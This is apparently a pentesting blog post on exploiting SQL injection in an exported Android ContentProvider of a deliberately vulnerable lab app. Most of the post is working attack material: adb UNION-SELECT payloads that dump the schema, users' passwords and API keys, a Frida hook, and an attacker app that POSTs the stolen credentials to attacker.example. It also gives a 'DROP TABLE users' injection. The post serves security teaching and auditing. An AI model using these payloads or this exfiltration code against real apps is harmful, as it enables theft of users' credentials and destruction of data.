---
title: Android - SQL Injection in a ContentProvider
author: nirajkharel
date: 2026-06-03 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, ContentProvider, SQL Injection]
render_with_liquid: false
---


ContentProviders that back onto SQLite and accept caller-supplied `selection` / `selectionArgs` / `sortOrder` parameters without parameterization are vulnerable to classic SQL injection. The attack surface is narrower than a web SQLi, you usually only get UNION-style data exfiltration through the cursor, but on an exported provider, any installed app can issue queries that read tables they were never meant to see.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/providers/VulnContentProvider.java</code> (query method)</li>
  </ul>
</aside>

<br>**The shape**

```java
@Override
public Cursor query(@NonNull Uri uri, @Nullable String[] projection,
                    @Nullable String selection, @Nullable String[] selectionArgs,
                    @Nullable String sortOrder) {

    String table = uri.getLastPathSegment();
    if (table == null) table = "users";

    // VULN: selection concatenated directly — SQL injection possible
    String where = (selection != null && !selection.isEmpty())
        ? " WHERE " + selection   // VULN: raw attacker string in SQL
        : "";

    String query = "SELECT * FROM " + table + where;
    Log.d(TAG, "[sql-injection] executing: " + query);

    return db.rawQuery(query, null);
}
```

Three injectable parameters in this provider:

**Selection**, concatenated into the WHERE clause via `" WHERE " + selection`. Standard SQLi.

**Table name (from URI path)**, `uri.getLastPathSegment()` is used as the table name verbatim. Attacker reads tables not in the provider's intended scope (e.g. `users`, `sessions`).

**Projection**, when `rawQuery` is used like here, projection is ignored, but variant providers that pass projection directly to `db.query` accept subqueries as "column" names: `(SELECT password FROM users WHERE id=1)`.

<br>**Identifying it**

Start in `AndroidManifest.xml` - same as any provider bug, it's where you get the `authority` and the reachability:

```xml
<provider
    android:name=".providers.VulnContentProvider"
    android:authorities="com.vulnlab.app.provider"
    android:exported="true" />
```

`android:authorities` is the host of every `content://` URI you'll query, `android:name` is the class to open next in the decompile, and `android:exported="true"` (or a weak/already-held permission) is what lets you reach it at all. A provider behind a `signature` permission isn't queryable, so the injection is unreachable no matter how injectable the code is.

With the authority and class name in hand, grep the decompile for that class's `query` implementation:

```bash
grep -rn '@Override.*public Cursor query' decompile/
```

For each, check:

```java
db.query(table, projection, selection, selectionArgs, ...);   // mostly safe if selectionArgs used
db.rawQuery(sql, args);                                       // potentially dangerous depending on sql
db.execSQL(stmt);                                             // dangerous
sqlBuilder.appendWhere(...);                                  // dangerous if input is concatenated
```

The vulnerability is when the parameters that go into the WHERE clause (or projection, or table name) are concatenated from attacker input rather than passed as `selectionArgs` (which SQLite binds safely).

Runtime hook on the vulnerable class directly:

```javascript
Java.perform(function () {
  const VP = Java.use('com.vulnlab.app.providers.VulnContentProvider');
  VP.query.implementation = function (uri, proj, sel, selArgs, sort) {
    console.log('[VulnContentProvider.query] uri=' + uri + ' selection=' + sel);
    return this.query(uri, proj, sel, selArgs, sort);
  };
});
```

Fire the probes below via `adb` and watch what concatenated SQL the provider actually builds (also visible in logcat under tag `VulnProvider`).

<br>**Confirming it, and shaping the query**

Before writing any exploit, three things have to be answered: is the `selection` actually evaluated as SQL, how many columns does the base query return, and what tables and columns exist. Black-box you derive each in turn; with the lab source you read them straight off the `CREATE TABLE` and skip ahead.

One quoting gotcha first: `adb shell` hands the command to a *second* shell on the device, which re-splits on spaces. A multi-word `--where` like `1=0 UNION SELECT 1` arrives as separate tokens and `content` rejects `UNION` as an unknown argument. Wrap the clause in single quotes *inside* the double quotes so the device shell keeps it as one token. (Those single quotes are the shell's, not SQL's - fine while the payload contains no `'`; when it does, run the query from the attacker app instead, where no second shell mangles it.)

**Is it injectable.** A boolean pair - the row count flips only if your string is parsed as SQL, not bound (`1=1` / `1=2` are single tokens, so they need no extra quoting):

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "1=1"   # all rows

adb shell content query --uri content://com.vulnlab.app.provider/users --where "1=2"   # none
```

A dangling keyword forces a syntax error - proof the clause is concatenated into a parsed statement, not bound as a literal:

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=1 AND'"   # SQLiteException in logcat
```

**How many columns.** The provider runs `SELECT * FROM users`, so a `UNION` has to supply the *same* column count. Walk it up until the syntax error clears:

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=0 UNION SELECT 1'"

adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=0 UNION SELECT 1,2,3,4,5'"   # clears → 5 columns
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-1.png">

`1=0` keeps the base rows out so only the injected row returns. `ORDER BY 6` works too - it errors while the ordinal exceeds the column count.

**What tables and columns.** With the count known, pull the schema from `sqlite_master` - `name` is the table, `sql` is its full `CREATE TABLE`:

```bash
adb shell content query \
    --uri content://com.vulnlab.app.provider/users \
    --where "'1=0 UNION SELECT name,sql,3,4,5 FROM sqlite_master'"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-2.png">

That hands you every table, every column, every constraint - which is where `users(id, email, password, role, api_key)` comes from. The exploit query just fills the five slots with the columns worth stealing:

```
1=1 UNION SELECT id, email, password, role, api_key FROM users
```

So the attacker app's hardcoded `UNION` below isn't a guess - it's the output of these three steps.

<br>**Attacker app**

The attacker app does three things. It builds the `content://` URI for the target table. It calls `getContentResolver().query(...)` with a malicious `selection` - `1=1 UNION SELECT ...` - which the provider concatenates straight into its `SELECT`, so the cursor comes back carrying whatever columns the injected query named. It walks that cursor and ships the rows to a server the attacker controls, on a background thread so the query doesn't block the UI:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = Uri.parse("content://com.vulnlab.app.provider/users");

        // injected UNION pulls admin creds + API keys from the same table
        Cursor c = getContentResolver().query(
            uri,
            null,
            "1=1 UNION SELECT id, email, password, role, api_key FROM users",
            null,
            null);

        StringBuilder out = new StringBuilder();
        if (c != null) {
            while (c.moveToNext()) {
                out.append(c.getString(1)).append('|')      // email
                   .append(c.getString(2)).append('|')      // password
                   .append(c.getString(4)).append('\n');    // api_key
            }
            c.close();
        }

        new Thread(() -> {                           // exfiltrate off the main thread
            try {
                new OkHttpClient().newCall(new Request.Builder()
                    .url("https://attacker.example/")
                    .post(RequestBody.create(out.toString().getBytes()))
                    .build()).execute();
            } catch (IOException ignored) {}
        }).start();
    }
}
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-3.png">

The injected `UNION SELECT` returns admin credentials and API keys from the same table, and the attacker POSTs them out with no prompt and nothing on screen. Variant: read tables the provider was never meant to expose by changing the URI path segment (e.g. `/sessions`).

The same dump straight from `adb`, no attacker app needed:

```bash
adb shell content query \
    --uri content://com.vulnlab.app.provider/users \
    --where "'1=1 UNION SELECT id, email, password, role, api_key FROM users'"
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-4.png">

<br>**The "but selectionArgs is safe" objection**

True if used. Many apps build the selection string by concatenation but then pass an empty `selectionArgs`. The `selectionArgs` parameter exists, it is just unused. The concatenated `selection` is the injection point.

A second variant: the developer passes `selectionArgs` correctly for some queries and not others. The provider has five query paths (paged through a switch on URI path). One of them uses concatenation. The other four are safe. The audit step is reading every branch.

<br>**The execSQL escalation, write primitive**

If the provider exposes `update`, `insert`, or `delete` via concatenated SQL, you have a write primitive:

```java
@Override
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
    String sql = "UPDATE users SET name = '" + values.getAsString("name") +
                 "' WHERE id = " + uri.getLastPathSegment();
    db.execSQL(sql);
    return 1;
}
```

The URI segment is concatenated into the WHERE. Attacker passes `1; DROP TABLE users; --` as the path segment. The `execSQL` runs both statements (on some SQLite configurations, depends on whether multi-statement is enabled).

Even without multi-statement, the attacker can update arbitrary rows by injecting into the WHERE: `id = 1 OR 1=1` updates every row.


<br>**Closing**

ContentProvider SQL injection is the classic web bug translated to IPC. The grep is on `SQLiteDatabase.query` / `rawQuery` / `execSQL` calls inside provider classes. The exploit is the standard UNION-SELECT one. Always check whether `selectionArgs` is actually used or just passed empty alongside a concatenated `selection`.

Happy Hacking !!
